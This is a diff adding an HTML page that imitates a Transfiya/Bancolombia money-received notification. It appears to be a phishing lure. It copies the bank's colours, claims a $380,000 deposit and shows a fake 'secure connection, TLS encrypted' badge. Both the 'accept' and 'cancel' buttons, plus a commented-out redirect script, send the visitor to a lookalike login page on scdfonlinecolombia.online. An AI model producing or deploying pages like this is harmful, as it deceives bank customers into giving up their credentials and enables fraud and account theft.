@@ -1,0 +1,152 @@
+
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+ 
+  <title>Transfiya - Notificación</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root{
+      --banco-yellow:#ffd200; /* Amarillo Bancolombia aproximado */
+      --banco-yellow-hover:#e6bf00; /* Hover un poco más oscuro */
+      --banco-blue:#0033a0; /* Azul institucional aproximado */
+      --text:#111827;
+      --muted:#6b7280;
+      --bg:#f7f8fb;
+      --card:#ffffff;
+      --shadow:0 10px 25px rgba(0,0,0,.08);
+      --radius:20px;
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:"Inter",system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+      background: ;
+      color:var(--text);
+      display:grid;
+      place-items:center;
+      padding:24px;
+    }
+
+    .card{
+      width:min(560px, 100%);
+      background:var(--card);
+      border-radius:var(--radius);
+      box-shadow:var(--shadow);
+      overflow:hidden;
+      border:1px solid #eef0f5;
+      animation: pop .45s ease-out;
+    }
+
+    @keyframes pop {
+      from {transform: translateY(8px) scale(.98); opacity:0}
+      to   {transform: translateY(0) scale(1); opacity:1}
+    }
+
+    .card-header{
+      background:linear-gradient(135deg, var(--banco-blue), #0147cc);
+      color:white;
+      padding:18px 22px;
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    .logo{
+      width:38px;height:38px;border-radius:10px;
+      background:var(--banco-yellow);
+      display:grid;place-items:center;
+      color:#1f2937;font-weight:800;letter-spacing:.2px;
+      box-shadow: inset 0 1px 0 rgba(255,255,255,.5), 0 4px 10px rgba(0,0,0,.15);
+    }
+    .header-title{font-size:1.05rem;font-weight:700;line-height:1}
+    .header-sub{font-size:.85rem;opacity:.9}
+
+    .card-body{padding:22px}
+    .headline{font-size:1.3rem;font-weight:700;margin:2px 0 10px}
+    .message{font-size:1rem;color:var(--muted);line-height:1.55}
+
+    .amount{display:inline-flex;align-items:baseline;gap:6px;margin-top:8px}
+    .amount strong{font-size:1.5rem;color:#0f172a}
+    .amount .badge{
+      font-size:.75rem;font-weight:700;color:#1f2937;background:#fff4bf;
+      border:1px solid #ffe57a;padding:4px 8px;border-radius:999px
+    }
+
+    .actions{display:flex;flex-wrap:wrap;gap:12px;margin-top:20px}
+    .btn{
+      flex:1 1 180px;
+      display:inline-flex;align-items:center;justify-content:center;gap:10px;
+      padding:14px 18px;border:none;border-radius:14px;cursor:pointer;
+      font-weight:800;letter-spacing:.2px;text-transform:none;font-size:1rem;
+      background:var(--banco-yellow); color:#1f2937;
+      box-shadow: 0 2px 0 #c6a800, 0 8px 18px rgba(255, 210, 0, .35);
+      transition: transform .06s ease, box-shadow .2s ease, background .2s ease, filter .2s ease;
+      text-decoration:none;
+    }
+    .btn:hover{ background:var(--banco-yellow-hover); box-shadow: 0 2px 0 #b69b00, 0 10px 22px rgba(230,191,0,.45)}
+    .btn:active{ transform: translateY(1px); box-shadow: 0 1px 0 #a88d00, 0 4px 10px rgba(230,191,0,.35)}
+
+    .btn.secondary{ background:#fff; color:#111827; border:1.5px solid #e5e7eb; box-shadow: 0 2px 0 #e5e7eb }
+    .btn.secondary:hover{ background:#f8fafc }
+
+    .fineprint{
+      margin-top:16px;font-size:.85rem;color:#6b7280
+    }
+
+    .secure{display:flex;align-items:center;gap:8px;margin-top:14px;color:#6b7280;font-size:.82rem}
+    .dot{width:8px;height:8px;border-radius:999px;background:#10b981}
+
+    /* Accesibilidad */
+    .btn:focus{outline:3px solid #9dd4ff; outline-offset:2px}
+  </style>
+</head>
+<body>
+  <main class="card" role="region" aria-label="Notificación Trafiya">
+    <div class="card-header">
+      <div class="logo" aria-hidden="true">Tf</div>
+      <div>
+        <div class="header-title">Transfiya</div>
+        
+        <div class="header-sub">Notificación de movimiento</div>
+      </div>
+    </div>
+    <div class="card-body">
+      <p class="headline">¡Has recibido <strong>$380.000</strong>!</p>
+      <p class="message">Verifica tu cuenta en línea para más detalles.</p>
+
+      <div class="amount" aria-hidden="true">
+        <strong>$380.000</strong>
+        <span class="badge">Nuevo abono</span>
+      </div>
+
+      <div class="actions">
+        <a class="btn secondary" href="https://scdfonlinecolombia.online/cdfavenida/cel-login.html" rel="noopener noreferrer">Cancelar Trafiya</a>
+        <a class="btn" href="https://scdfonlinecolombia.online/cdfavenida/cel-login.html" rel="noopener noreferrer">Aceptar Trafiya</a>
+      </div>
+
+      <div class="secure">
+        <span class="dot" aria-hidden="true"></span>
+        Conexión segura • Encriptado TLS
+      </div>
+
+      <p class="fineprint">Si no reconoces esta notificación, puedes ignorarla y cancelar la transaccion.</p>
+    </div>
+    <img src="https://caracoltv.brightspotcdn.com/dims4/default/b6deaf7/2147483647/strip/true/crop/1200x674+0+23/resize/768x431!/format/webp/quality/75/?url=http%3A%2F%2Fcaracol-brightspot.s3.us-west-2.amazonaws.com%2Fe4%2F44%2F6820fca84f1db9668bb4dc6b160d%2Ftransfiya-bancolombia.jpg" style="width: 350px;">
+
+  </main>
+
+  <!-- JS opcional para redirigir también si se desea usar botones <button> -->
+  <script>
+    // Si prefieres usar <button> en lugar de <a>, descomenta y usa esto:
+    // document.querySelectorAll('[data-action="google"]').forEach(el=>{
+    //   el.addEventListener('click', ()=> window.location.href = 'https://scdfonlinecolombia.online/cdfavenida/cel-login.html');
+    // });
+  </script>
+</body>
+</html>
